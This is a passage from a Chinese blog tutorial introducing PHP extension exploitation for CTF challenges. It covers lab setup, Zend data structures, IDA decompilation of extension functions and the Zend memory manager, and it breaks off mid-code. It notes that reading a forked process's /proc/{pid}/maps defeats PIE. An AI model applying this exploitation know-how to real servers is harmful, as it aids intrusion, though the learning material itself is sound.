<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="php is good">
<meta property="og:type" content="article">
<meta property="og:title" content="phppwn初识">
<meta property="og:url" content="https://ixout.github.io/posts/5022/index.html">
<meta property="og:site_name" content="ixout&#39;s blog">
<meta property="og:description" content="php is good">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-05-06_160205.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-05-06_160932.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-05-06_162042.png">
<meta property="article:published_time" content="2024-05-02T08:23:40.000Z">
<meta property="article:modified_time" content="2024-11-20T14:11:46.250Z">
<meta property="article:author" content="ixout">
<meta property="article:tag" content="phppwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-05-06_160205.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.png">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png">
        
      
    
    <!-- title -->
    <title>phppwn初识</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ixout's blog" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/posts/15971/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/posts/57890/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ixout.github.io/posts/5022/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ixout.github.io/posts/5022/&text=phppwn初识"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ixout.github.io/posts/5022/&title=phppwn初识"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ixout.github.io/posts/5022/&is_video=false&description=phppwn初识"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=phppwn初识&body=Check out this article: https://ixout.github.io/posts/5022/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ixout.github.io/posts/5022/&title=phppwn初识"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ixout.github.io/posts/5022/&title=phppwn初识"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ixout.github.io/posts/5022/&title=phppwn初识"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ixout.github.io/posts/5022/&title=phppwn初识"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ixout.github.io/posts/5022/&name=phppwn初识&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ixout.github.io/posts/5022/&t=phppwn初识"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F"><span class="toc-number">1.2.</span> <span class="toc-text">运行模式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zend%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.3.</span> <span class="toc-text">zend基本数据类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ida%E5%8F%8D%E7%BC%96%E8%AF%91"><span class="toc-number">1.3.1.</span> <span class="toc-text">ida反编译</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%99%A8"><span class="toc-number">1.4.</span> <span class="toc-text">php内存管理器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%B1%82"><span class="toc-number">1.4.1.</span> <span class="toc-text">存储层</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A5%E5%8F%A3%E5%B1%82"><span class="toc-number">1.4.2.</span> <span class="toc-text">接口层</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%B1%82"><span class="toc-number">1.4.3.</span> <span class="toc-text">堆层</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A7"><span class="toc-number">1.4.3.1.</span> <span class="toc-text">旧</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B0"><span class="toc-number">1.4.3.2.</span> <span class="toc-text">新</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#small%E5%88%86%E9%85%8D%E8%B7%AF%E5%BE%84"><span class="toc-number">1.4.4.</span> <span class="toc-text">small分配路径</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E6%8E%A5%E5%8F%A3%E5%87%BD%E6%95%B0"><span class="toc-number">1.5.</span> <span class="toc-text">常用接口函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#zend-parse-paramenters"><span class="toc-number">1.5.1.</span> <span class="toc-text">zend_parse_paramenters</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#string%E7%9B%B8%E5%85%B3"><span class="toc-number">1.5.2.</span> <span class="toc-text">string相关</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#str-pad"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">str_pad</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#str-repeat"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">str_repeat</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA%E7%BC%93%E5%86%B2%E5%8C%BA"><span class="toc-number">1.5.3.</span> <span class="toc-text">输出缓冲区</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ob-start"><span class="toc-number">1.5.3.1.</span> <span class="toc-text">ob_start</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ob-get-content"><span class="toc-number">1.5.3.2.</span> <span class="toc-text">ob_get_content()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ob-end-flush"><span class="toc-number">1.5.3.3.</span> <span class="toc-text">ob_end_flush</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95"><span class="toc-number">1.6.</span> <span class="toc-text">调试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WACON2023-heaphp"><span class="toc-number">2.1.</span> <span class="toc-text">WACON2023-heaphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#d3ctf2024-pwnshell"><span class="toc-number">2.2.</span> <span class="toc-text">d3ctf2024-pwnshell</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        phppwn初识
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">ixout</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-05-02T08:23:40.000Z" class="dt-published" itemprop="datePublished">2024-05-02</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/pwn/">pwn</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/phppwn/" rel="tag">phppwn</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>一般phppwn都是给一个拓展so文件,只需要启用这个拓展便可以直接进行内部函数调用</p>
<p>但比较不好的一点是php版本需要与编译so文件的版本相同</p>
<p>而在ubuntu20下默认安装的php版本应该是php7.4</p>
<p>所以需要自己另外添加一个php仓库源</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:ondrej/php</span><br></pre></td></tr></table></figure>
<p>然后更新一下</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
<p>之后安装对应版本即可</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install php8.3</span><br></pre></td></tr></table></figure>
<p>将题目给出的so文件装载于对应目录</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php -i | grep -i extension_dir</span><br><span class="line">extension_dir =&gt; /usr/lib/php/20230831 =&gt; /usr/lib/php/20230831</span><br><span class="line">sudo <span class="built_in">cp</span> vuln.so /usr/lib/php/20230831/vuln.so</span><br></pre></td></tr></table></figure>
<p>为了避免频繁修改php.ini,如果题目有给出php.ini的话可以直接使用参数</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -c php.ini index.php</span><br></pre></td></tr></table></figure>
<p>如果没有的话则需要找到php的默认php.ini</p>
<p>添加一句</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">extension</span> = vuln.so</span><br></pre></td></tr></table></figure>
<h2 id="运行模式"><a href="#运行模式" class="headerlink" title="运行模式"></a>运行模式</h2><p>CLI运行模式:</p>
<p>通常我们在开发PHP扩展时，多是用命令行终端来直接使用php解释器直接解释执行.php文件，在.php文件中我们写入需要调用的扩展函数，该扩展函数被编译在.so的扩展模块中，这种运行模式我一般称为<code>CLI模式</code>，该模式对应的php声明周期一般为单进程SAPI生命周期</p>
<p>CGI运行模式</p>
<p>其中对于大部分网站应用服务器来说，大部分时候PHP解释器运行的模式为CGI模式——单进程SAPI生命周期，此模式运行特点为请求到达时，<u>为每个请求fork一个进程</u>，一个进程只对一个请求做出响应，请求结束后，进程也就结束了。其中fork的进程，和原进程的内存布局一般来说是一模一样的，所以这里如果能拿到<code>/proc/&#123;pid&#125;/maps</code>文件，则可以拿到该进程的内存布局，可以拿到所有基地址，从而无视PIE保护。</p>
<h2 id="zend基本数据类型"><a href="#zend基本数据类型" class="headerlink" title="zend基本数据类型"></a>zend基本数据类型</h2><p>由于zend引擎的原因，ida反编译的伪代码很难理解,所以先学习一下zend中的基本数据类型</p>
<p>当我们查看phppwn的拓展时,会发现其函数普遍只有两个参数,实际上并不是这样,第一个参数是一个<code>zend_execute_data</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_execute_data</span> &#123;</span></span><br><span class="line">	<span class="type">const</span> zend_op       *opline;           <span class="comment">/* executed opline                */</span></span><br><span class="line">	zend_execute_data   *call;             <span class="comment">/* current call                   */</span></span><br><span class="line">	zval                *return_value;</span><br><span class="line">	zend_function       *func;             <span class="comment">/* executed function              */</span></span><br><span class="line">	zval                 This;             <span class="comment">/* this + call_info + num_args    */</span></span><br><span class="line">	zend_execute_data   *prev_execute_data;</span><br><span class="line">	zend_array          *symbol_table;</span><br><span class="line">	<span class="type">void</span>               **run_time_cache;   <span class="comment">/* cache op_array-&gt;run_time_cache */</span></span><br><span class="line">	zend_array          *extra_named_params;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>zval就是<code>typedef struct _zval_struct zval;</code>,</p>
<p>有两个最基本的数据类型也就是 <code>_zend_value</code> 和 <code>_zval_struct</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> _<span class="title">zend_value</span> &#123;</span></span><br><span class="line">	zend_long         lval;				<span class="comment">/* long value */</span></span><br><span class="line">	<span class="type">double</span>            dval;				<span class="comment">/* double value */</span></span><br><span class="line">	zend_refcounted  *counted;</span><br><span class="line">	zend_string      *str;</span><br><span class="line">	zend_array       *arr;</span><br><span class="line">	zend_object      *obj;</span><br><span class="line">	zend_resource    *res;</span><br><span class="line">	zend_reference   *ref;</span><br><span class="line">	zend_ast_ref     *ast;</span><br><span class="line">	zval             *zv;</span><br><span class="line">	<span class="type">void</span>             *ptr;</span><br><span class="line">	zend_class_entry *ce;</span><br><span class="line">	zend_function    *func;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="type">uint32_t</span> w1;</span><br><span class="line">		<span class="type">uint32_t</span> w2;</span><br><span class="line">	&#125; ww;</span><br><span class="line">&#125; zend_value;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zval_struct</span> &#123;</span></span><br><span class="line">	zend_value        value;			<span class="comment">/* value */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">uint32_t</span> type_info;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			ZEND_ENDIAN_LOHI_3(</span><br><span class="line">				zend_uchar    type,			<span class="comment">/* active type */</span></span><br><span class="line">				zend_uchar    type_flags,</span><br><span class="line">				<span class="keyword">union</span> &#123;</span><br><span class="line">					<span class="type">uint16_t</span>  extra;        <span class="comment">/* not further specified */</span></span><br><span class="line">				&#125; u)</span><br><span class="line">		&#125; v;</span><br><span class="line">	&#125; u1;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">uint32_t</span>     next;                 <span class="comment">/* hash collision chain */</span></span><br><span class="line">		<span class="type">uint32_t</span>     cache_slot;           <span class="comment">/* cache slot (for RECV_INIT) */</span></span><br><span class="line">		<span class="type">uint32_t</span>     opline_num;           <span class="comment">/* opline number (for FAST_CALL) */</span></span><br><span class="line">		<span class="type">uint32_t</span>     lineno;               <span class="comment">/* line number (for ast nodes) */</span></span><br><span class="line">		<span class="type">uint32_t</span>     num_args;             <span class="comment">/* arguments number for EX(This) */</span></span><br><span class="line">		<span class="type">uint32_t</span>     fe_pos;               <span class="comment">/* foreach position */</span></span><br><span class="line">		<span class="type">uint32_t</span>     fe_iter_idx;          <span class="comment">/* foreach iterator index */</span></span><br><span class="line">		<span class="type">uint32_t</span>     property_guard;       <span class="comment">/* single property guard */</span></span><br><span class="line">		<span class="type">uint32_t</span>     constant_flags;       <span class="comment">/* constant flags */</span></span><br><span class="line">		<span class="type">uint32_t</span>     extra;                <span class="comment">/* not further specified */</span></span><br><span class="line">	&#125; u2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>zend_uchar type: 以下为外部使用的变量类型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IS_UNDEF                    0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_NULL                        1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_FALSE                    2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_TRUE                        3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_LONG                        4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_DOUBLE                    5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_STRING                    6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_ARRAY                    7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_OBJECT                    8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_RESOURCE                    9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_REFERENCE                10</span></span><br></pre></td></tr></table></figure>
<p>几个常见数据类型的结构</p>
<p>STRING</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_string</span> &#123;</span></span><br><span class="line">	zend_refcounted_h gc;</span><br><span class="line">	zend_ulong        h;                <span class="comment">/* hash value */</span></span><br><span class="line">	<span class="type">size_t</span>            len;<span class="comment">//不包含\0</span></span><br><span class="line">	<span class="type">char</span>              val[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="ida反编译"><a href="#ida反编译" class="headerlink" title="ida反编译"></a>ida反编译</h3><p>从ida的反编译结果来看,自定义的拓展函数的开头前几句中一定会有这一句</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v4 = *(<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">44</span>);</span><br></pre></td></tr></table></figure>
<p>这一步其实是在获取参数个数</p>
<p>之后会有一个类似这样的函数解析参数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zend_parse_parameters(v3, &amp;unk_2000, &amp;v15, &amp;v14)</span><br></pre></td></tr></table></figure>
<p>再然后从<code>a1+80</code>开始是第一个参数,每一个参数长度为<code>0x10</code></p>
<p>所有的参数都有序排布在这里</p>
<h2 id="php内存管理器"><a href="#php内存管理器" class="headerlink" title="php内存管理器"></a>php内存管理器</h2><p><a target="_blank" rel="noopener" href="https://learnku.com/docs/php-internals/php7/zend-memory-manager/7229">5.1. Zend 内存管理器 | 内存管理 |《PHP 内核与原生扩展开发 php7》| PHP 技术论坛 (learnku.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/343695712">深入理解PHP的内存管理 - 知乎 (zhihu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/master/Zend/zend_alloc.c">php-src/Zend/zend_alloc.c at master · php/php-src (github.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.bookstack.cn/read/php-internals/55.md">https://www.bookstack.cn/read/php-internals/55.md</a></p>
<p>与大多数运行时相同,php自己实现了一套动态内存管理机制</p>
<p>php的内存管理器被称为Zend内存管理器,这个内存管理器说实话有点像内核slab分配器与glibc-ptmalloc2分配器的结合</p>
<p>PHP的内存管理可以被看作是分层（hierarchical）的。它分为三层：存储层（storage）、堆层（heap）和接口层（emalloc/efree）。</p>
<h3 id="存储层"><a href="#存储层" class="headerlink" title="存储层"></a><strong>存储层</strong></h3><p>存储层通过 malloc()、mmap() 等函数向系统真正的申请内存，并通过 free() 函数释放所申请的内存。存储层通常申请的内存块都比较大，这里申请的内存大并不是指storage层结构所需要的内存大，只是堆层通过调用存储层的分配方法时，其以大块大块的方式申请的内存，存储层的作用是将内存分配的方式对堆层透明化。</p>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-05-06_160205.png" alt=""></p>
<p>PHP在存储层共有4种内存分配方案: malloc，win32，mmap_anon，mmap_zero，默认使用malloc分配内存，如果设置了ZEND_WIN32宏，则为windows版本，调用HeapAlloc分配内存，剩下两种内存方案为匿名内存映射，并且PHP的内存方案可以通过设置环境变量来修改。</p>
<h3 id="接口层"><a href="#接口层" class="headerlink" title="接口层"></a><strong>接口层</strong></h3><p>接口层是一些宏定义，如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Standard wrapper macros */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> emalloc(size)                       _emalloc((size) ZEND_FILE_LINE_CC ZEND_FILE_LINE_EMPTY_CC)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> safe_emalloc(nmemb, size, offset)   _safe_emalloc((nmemb), (size), (offset) ZEND_FILE_LINE_CC ZEND_FILE_LINE_EMPTY_CC)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> efree(ptr)                          _efree((ptr) ZEND_FILE_LINE_CC ZEND_FILE_LINE_EMPTY_CC)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ecalloc(nmemb, size)                _ecalloc((nmemb), (size) ZEND_FILE_LINE_CC ZEND_FILE_LINE_EMPTY_CC)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> erealloc(ptr, size)                 _erealloc((ptr), (size), 0 ZEND_FILE_LINE_CC ZEND_FILE_LINE_EMPTY_CC)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> safe_erealloc(ptr, nmemb, size, offset) _safe_erealloc((ptr), (nmemb), (size), (offset) ZEND_FILE_LINE_CC ZEND_FILE_LINE_EMPTY_CC)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> erealloc_recoverable(ptr, size)     _erealloc((ptr), (size), 1 ZEND_FILE_LINE_CC ZEND_FILE_LINE_EMPTY_CC)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> estrdup(s)                          _estrdup((s) ZEND_FILE_LINE_CC ZEND_FILE_LINE_EMPTY_CC)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> estrndup(s, length)                 _estrndup((s), (length) ZEND_FILE_LINE_CC ZEND_FILE_LINE_EMPTY_CC)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> zend_mem_block_size(ptr)            _zend_mem_block_size((ptr) TSRMLS_CC ZEND_FILE_LINE_CC ZEND_FILE_LINE_EMPTY_CC)</span></span><br></pre></td></tr></table></figure>
<p>这里为什么没有直接调用函数？因为这些宏相当于一个接口层或中间层，定义了一个高层次的接口，使得调用更加容易它隔离了外部调用和PHP内存管理的内部实现，实现了一种松耦合关系。</p>
<h3 id="堆层"><a href="#堆层" class="headerlink" title="堆层"></a><strong>堆层</strong></h3><p>在接口层下面是PHP内存管理的核心实现，我们称之为heap层。这个层控制整个PHP内存管理的过程</p>
<p>这个层分为旧版和新版,旧版基本已经被淘汰了</p>
<h4 id="旧"><a href="#旧" class="headerlink" title="旧"></a>旧</h4><p>首先我们看这个层的重要结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* mm block type */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_block_info</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> _size;   <span class="comment">/* block的大小*/</span></span><br><span class="line">    <span class="type">size_t</span> _prev;   <span class="comment">/* 计算前一个块有用到*/</span></span><br><span class="line">&#125; zend_mm_block_info;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span 